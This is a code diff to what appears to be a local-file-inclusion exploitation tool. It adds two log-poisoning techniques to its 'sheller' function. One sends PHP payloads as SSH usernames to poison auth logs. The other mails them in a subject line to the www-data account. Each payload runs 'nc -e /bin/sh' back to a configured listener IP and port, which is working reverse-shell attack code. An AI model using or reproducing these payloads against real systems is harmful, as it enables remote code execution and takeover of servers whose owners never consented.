@@ -18,7 +18,7 @@ _____, ___
 """
 
 from core.methods.session import session
-import requests, sys
+import requests, sys, subprocess
 from core.colors import color
 from core.variables import payloadlist, nullchars, timeout, LISTENIP, LISTENPORT
 from core.methods.filecheck import filecheck
@@ -600,9 +600,29 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             s.send(prep2)
             s.send(prep)
         elif technique == 3:
-            pass
+            tmp = url.split("://")[1]
+            if "@" in tmp:
+                tmp = tmp.split("@")[1]
+            host = tmp.split("/")[0].split(":")[0]
+            sshs = ['<?php system("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
+            '<?php exec("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
+            '<?php passthru("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
+            for ssh in sshs:
+                subprocess.call(["ssh", ssh])
+            s.send(prep)
         elif technique == 4:
-            pass
+            tmp = url.split("://")[1]
+            if "@" in tmp:
+                tmp = tmp.split("@")[1]
+            topics = ['I<3shells <?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT), 
+            'I<3shells <?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT), 
+            'I<3shells <?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)]
+            host = tmp.split("/")[0].split(":")[0]
+            for topic in topics:
+                p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
+                subprocess.call(["mail", "-s", topic, "www-data@{}".format(host)], stdin=p.stdout)
+            s.send(prep)
+
 
         
 def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
